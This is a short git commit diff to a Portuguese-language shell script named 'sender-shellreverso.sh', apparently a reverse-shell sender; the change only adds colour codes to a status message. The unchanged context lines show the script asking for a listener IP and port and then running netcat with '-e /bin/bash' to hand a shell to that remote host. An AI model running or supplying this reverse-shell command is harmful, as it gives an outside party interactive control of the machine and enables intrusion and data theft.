610e69756e7b315497bb3cd1f6ecd1a4782dfed2
Eduardo <53496439+eduardbuzzi@users.noreply.github.com>
2020-04-01 13:55:23 -0300

    Update sender-shellreverso.sh

--- sender-shellreverso.sh
+++ sender-shellreverso.sh
@@ -4,7 +4,7 @@ echo
 read -p "Informe o IP no qual deseja enviar a Shell: " IPlistening
 read -p "Informe a porta que está escutando: " PORTA
 echo
-echo "Enviando a Shell para a porta $PORTA do $IPlistening .."
+echo -e "Enviando a Shell para a porta \033[01;31m$PORTA\033[01;00m do \033[01;31m$IPlistening\033[01;00m"
 echo
 trap 2
 nc $IPlistening $PORTA -e /bin/bash
